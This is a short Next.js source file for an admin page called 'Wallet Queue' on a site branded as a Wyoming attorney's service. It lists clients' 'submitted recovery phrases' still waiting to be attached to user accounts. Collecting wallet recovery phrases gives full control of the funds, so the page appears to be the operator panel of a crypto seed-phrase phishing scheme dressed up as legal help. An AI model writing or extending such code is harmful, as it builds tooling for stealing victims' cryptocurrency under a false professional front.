import { AdminWalletsTable } from '@/components/admin/AdminWalletsTable';
import { PageHeader } from '@/components/ui';
import { listAdminUsers, listAllWallets } from '@/lib/queries';
import { requireAdmin } from '@/lib/session';

export const dynamic = 'force-dynamic';
export const metadata = { title: 'Wallet Queue — Wyoming Attorney Admin' };

export default async function AdminWalletQueuePage() {
    await requireAdmin();
    const [submissions, users] = await Promise.all([
        listAllWallets(),
        listAdminUsers()
    ]);

    // Unlinked submissions waiting in the queue
    const queueSubmissions = submissions.filter((s) => !s.user_id);

    return (
        <div className="space-y-6">
            <PageHeader
                eyebrow="Administration · Wallets"
                title="Wallet Queue"
                description="Incoming submitted recovery phrases waiting to be reviewed and attached to verified client accounts."
            />

            <div className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-xs text-amber-900 flex items-start gap-3">
                <span className="text-base">⏳</span>
                <div>
                    <strong className="font-semibold block mb-0.5">Pending Account Attachment</strong>
                    Submissions shown here are unattached phrases from client submissions. Once linked, they transition to the <strong>Linked Wallets</strong> registry.
                </div>
            </div>

            <AdminWalletsTable
                submissions={queueSubmissions}
                users={users.map((user) => ({ id: user.id, email: user.email, display_name: user.display_name }))}
                mode="queue"
            />
        </div>
    );
}
